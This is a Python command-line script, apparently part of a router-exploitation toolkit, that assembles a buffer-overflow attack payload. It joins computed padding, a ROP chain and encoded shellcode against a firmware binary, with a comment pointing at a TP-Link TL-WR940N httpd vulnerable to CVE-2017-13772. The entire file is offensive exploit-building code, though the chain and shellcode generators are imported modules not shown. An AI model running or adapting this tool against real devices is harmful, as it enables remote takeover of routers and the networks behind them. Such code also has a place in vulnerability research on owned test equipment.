#!/usr/bin/python3

from optparse import *

from router_exp_shovel.offset_calculator import Offset_Calculator
from router_exp_shovel.ROP_maker import ROP_Maker
from router_exp_shovel.shellcode_maker import Shellcode_Maker

def returnAttackBlock(binaryFilePath,binaryBaseAddr,overflowFPO,libraryFilePath,libraryBaseAddr,arch):
	#Get the Control offset for generate padding
	#OffsetP = GetGeneratePadding("/root/work/vuln-exp-auto/CVE-2017-13772/TL-WR940N(US)_V4_160617_1476690524248q/_wr940nv4_us_3_16_9_up_boot(160617).bin.extracted/squashfs-root/usr/bin/httpd", 0x00478584)
	calculator = Offset_Calculator(binaryPath = binaryFilePath, overflowAddress = overflowFPO)
	paddingSize = str(calculator.getGeneratePadding())
	print("\033[1;;34m[INFO]\033[0m Get padding size: " + paddingSize)
	
	#print paddings
	prevoPadding = 'A' * int(paddingSize)
	print("\033[1;;34m[INFO]\033[0m Padding is: " + prevoPadding)

	#make rop chain
	ropmaker = ROP_Maker(binaryFilePath = binaryFilePath, libFilePath = libraryFilePath,binaryBaseAddr = binaryBaseAddr, libraryBaseAddr = libraryBaseAddr,arch = arch)
	ropchain = ropmaker.getRopChain()
	print("\033[1;;34m[INFO]\033[0m ROP chain generated: " + ropchain)

	#Get the encode ShellCode 
	shellNum = 1
	shellcodemaker = Shellcode_Maker(shellcodeNum=shellNum)
	shellcode = shellcodemaker.getEncodeShellcode()	
	print("\033[1;;34m[INFO]\033[0m Use shellcode "+str(shellNum)+": " + shellcode)

	attackBlock = prevoPadding + ropchain + shellcode
	#write to File
	attackBlockF = open("results/attackBlock.txt","w+")
	attackBlockF.write("attackBlock = \"")
	attackBlockF.write(attackBlock)
	attackBlockF.write("\"")
	attackBlockF.close()
	print("\033[1;;32m[SUCCESS]\033[0m Attack block generated: "+attackBlock)
	print("\033[1;;32m[SUCCESS]\033[0m Attack block is saved in results/attackBlock.txt")
	
	return 0

def main():
	#handle argument
	parser = OptionParser()
	parser.add_option("-b", "--binaryFile", dest="binaryFilePath", help="input binary file path")
	parser.add_option("--ba", "--binaryBaseAddr", dest="binaryBaseAddr", help="input binary base address,default=0x00400000", default=0x00400000)
	parser.add_option("-l", "--libraryFile", dest="libraryFilePath", help="input libc file path",default=None)
	parser.add_option("--la", "--libraryBaseAddr", dest="libraryBaseAddr", help="input library base address,default=0x2aae2000",default=0x2aae2000)
	parser.add_option("-o", "--overflowPoint", dest="overflowFunctionPointOffset", help="input overflow function point offset")
	parser.add_option("--arch", dest="arch", help="input architecture of elf files,[little] or [big],default=big",default='big')

	options, args = parser.parse_args()

	if options.binaryFilePath == None: 
		parser.error("\033[1;;31m[ERROR]\033[0m No binary file path specified, input binary file path, such as [sudo python xxx.py -b xxx/xxx]")
		return -1

	if options.overflowFunctionPointOffset == None: 
		parser.error("\033[1;;31m[ERROR]\033[0m No overflow function point specified, input overflow function point offset, such as [sudo python xxx.py -o 0xXXXXX]")
		return -1

	binaryFilePath = options.binaryFilePath
	overflowFPO = int(options.overflowFunctionPointOffset,16)

	returnAttackBlock(binaryFilePath,options.binaryBaseAddr,overflowFPO,options.libraryFilePath,options.libraryBaseAddr,options.arch)


if __name__ == '__main__':
	main()


